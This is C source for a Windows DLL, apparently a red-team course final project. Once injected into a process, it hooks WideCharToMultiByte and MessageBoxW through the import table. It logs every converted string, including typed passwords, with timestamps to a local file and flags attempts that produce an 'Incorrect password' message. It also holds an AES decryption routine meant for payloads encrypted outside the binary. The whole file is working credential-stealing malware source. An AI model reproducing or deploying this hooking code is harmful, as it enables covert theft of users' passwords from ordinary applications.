// HOOKING function

#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "user32.lib")
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// a pointer to the unhooked functions
// mainly here for proper returning of hooked functions / incase of required usage
int (WINAPI * pWideCharToMultiByte) (UINT CodePage,DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) = WideCharToMultiByte;
  
int (WINAPI * pMessageBoxW) (HWND hWnd,LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) = MessageBoxW;

// simple AES decryption, encryption is done outside of PE for obvious reasons
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

// hookedMsgBox is a function which checks if a "wrong password" message is passed to MessageBoxW.
// If it is, the password previously passed (to widechar function below) is marked as wrong.
int hookedMsgBox(HWND hWnd,LPCWSTR lpText, LPCWSTR lpCaption, UINT uType){
	
	// Wrong password identifier string
	char passMsg[] = "Operation failed due to one or more of the following:\r\n - Incorrect password.";
	
	char wrongpass[] = "(WRONG PASSWORD)";
	
	// Checking lptext against passMsg
	int isTheSame = 1;
	int i = 0;	
	while (passMsg[i] != 0){
		if (passMsg[i] != lpText[i]){
			isTheSame = 0;
		}
		i++;
	}

	// Appending wrongpass to the password file
	if (isTheSame){
		OutputDebugStringA("FOUND IT");
		HANDLE hFile; 
		DWORD dwBytesToWrite = (DWORD)strlen(wrongpass);
		DWORD dwBytesWritten = 0;
		BOOL bErrorFlag = FALSE;
		
		// should probably be in a more hidden location if its real..
		hFile = CreateFile("C:\\RTO\\MDI\\07.FinalProject\\pwdFile", FILE_APPEND_DATA | FILE_GENERIC_READ, 0, 
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		
		if (hFile == INVALID_HANDLE_VALUE){ 
			OutputDebugStringA("Invalid handle value");
			return 1;
		}
		
		bErrorFlag = WriteFile(hFile, wrongpass, dwBytesToWrite, &dwBytesWritten, NULL);
		CloseHandle(hFile);	
	}
	
	return pMessageBoxW(hWnd, lpText, lpCaption, uType);
}

//appends localtime and lpMultiByteStr to the file
int hookedWideChar(UINT CodePage,DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {	
	
	char buffer[1000];
	SYSTEMTIME st, lt;
    GetSystemTime(&st);
    GetLocalTime(&lt);
    
    printf("The system time is: %02d:%02d\n", st.wHour, st.wMinute);
    printf(" The local time is: %02d:%02d\n", lt.wHour, lt.wMinute);
	sprintf( buffer, "\n% 02d/%02d/%02d %02d:%02d:%02d \t DATA = %ls ", lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute
	, lt.wSecond, lpWideCharStr); 
    HANDLE hFile; 
	DWORD dwBytesToWrite = (DWORD)strlen(buffer);
    DWORD dwBytesWritten = 0;
    BOOL bErrorFlag = FALSE;
    
	hFile = CreateFile("C:\\RTO\\MDI\\07.FinalProject\\pwdFile", FILE_APPEND_DATA | FILE_GENERIC_READ, 0, 
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
    if (hFile == INVALID_HANDLE_VALUE){ 
		OutputDebugStringA("Invalid handle value");
        return 1;
    }
	
	bErrorFlag = WriteFile(hFile, buffer, dwBytesToWrite, &dwBytesWritten, NULL);
    CloseHandle(hFile);	
	
	return pWideCharToMultiByte(CodePage, dwFlags,  lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, 
	 lpUsedDefaultChar);
	
}

//1 == hook, 0 == unhook
int IATHookUnhook(char * moduleName, char * functionName, void * newFunctionName, int hookOrUnhook){
	
	//getting address of import table
	ULONG_PTR baseAddr = (ULONG_PTR) GetModuleHandle(NULL);
	ULONG_PTR addrA = baseAddr;
	
	addrA = (ULONG_PTR)(((IMAGE_DOS_HEADER *)(addrA))->e_lfanew + baseAddr);
	addrA = (ULONG_PTR)(&((IMAGE_NT_HEADERS *)(addrA))->OptionalHeader);
	addrA = (ULONG_PTR)((IMAGE_DATA_DIRECTORY)(((IMAGE_OPTIONAL_HEADER *)(addrA))->DataDirectory[1])).VirtualAddress;
	addrA = (ULONG_PTR)((char *)addrA + baseAddr);
	
	//searching for required module, not pretty but just simple parsing thorugh ILT
	int found = -1;
	for (int i = 0; ((((IMAGE_IMPORT_DESCRIPTOR *)(addrA))[i+1].Name)+(char *)baseAddr) != 0; i++){
		if (!strcmp(((((IMAGE_IMPORT_DESCRIPTOR *)(addrA))[i].Name)+(char *)baseAddr),moduleName)){
			found = i;
			break;
		}
	}
	
	if (found == -1)
		return 1;
	
	//thunk contains the addresses of the functions
	//ogThunk contains the names of the functions
	IMAGE_THUNK_DATA * thunk = (IMAGE_THUNK_DATA *)(((IMAGE_IMPORT_DESCRIPTOR *)(addrA))[found].FirstThunk + (char *)baseAddr);
	IMAGE_THUNK_DATA * ogThunk = (IMAGE_THUNK_DATA *)(((IMAGE_IMPORT_DESCRIPTOR *)(addrA))[found].OriginalFirstThunk + (char *)baseAddr);

	//if the function is found, just replace the address in the IAT to the new function..
	for (int i = 0; thunk[i].u1.Function != 0; i++){
		if (!stricmp(((IMAGE_IMPORT_BY_NAME *)(ogThunk[i].u1.AddressOfData + (char *)baseAddr))->Name,
		functionName)){
			ULONGLONG oldFunction = thunk[i].u1.Function;
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID) &thunk[i].u1.Function, 4096, PAGE_READWRITE, &oldProtect);
			if (hookOrUnhook){
				(thunk[i].u1.Function) = (ULONGLONG)newFunctionName;
			} else {
				(thunk[i].u1.Function) = oldFunction;
			}
			VirtualProtect((LPVOID) &thunk[i].u1.Function, 4096, oldProtect, &oldProtect);	
			return 0;
		}
	}
	
	return 1;	
	
	
}

int IATHook(char * moduleName, char * functionName, void * newFunctionName){
	IATHookUnhook(moduleName, functionName, newFunctionName, 1 );
	return 0;
}

int IATUnhook(char * moduleName, char * functionName, void * newFunctionName){	
	IATHookUnhook(moduleName, functionName, newFunctionName, 0 );
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){

	switch (ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
		IATHook("KERNEL32.dll", "WideCharToMultiByte", hookedWideChar);
		IATHook("USER32.dll", "MessageBoxW", hookedMsgBox);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		IATUnhook("KERNEL32.dll", "WideCharToMultiByte", hookedWideChar);
		IATUnhook("USER32.dll", "MessageBoxW", hookedMsgBox);
		break;
	}
	return TRUE;
}